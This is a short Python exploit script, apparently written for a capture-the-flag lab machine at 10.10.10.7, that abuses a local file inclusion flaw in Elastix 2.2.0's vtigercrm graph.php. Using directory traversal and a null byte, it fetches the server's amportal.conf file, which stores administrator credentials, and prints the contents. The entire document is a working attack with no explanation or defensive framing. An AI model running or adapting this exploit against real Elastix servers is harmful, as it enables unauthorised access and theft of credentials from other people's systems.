import requests
import ssl

#target machine with installed elastix 2.2.0
target = 'https://10.10.10.7'

#parameters for the file inclusion
directory = 'vtigercrm'
language = 'en'
etc = 'etc'
directory_jump = '../../../../../../../../'
config_file = 'amportal.conf%00'
user_agent = {'User-agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)'}

# the url which will have the file content as response
target_url = f'{target}/{directory}/graph.php?{language}={directory_jump}{etc}/{config_file}&module=Accounts&action'

#request for the file inclusion
response = requests.get(target_url, verify=False)

print(response.text)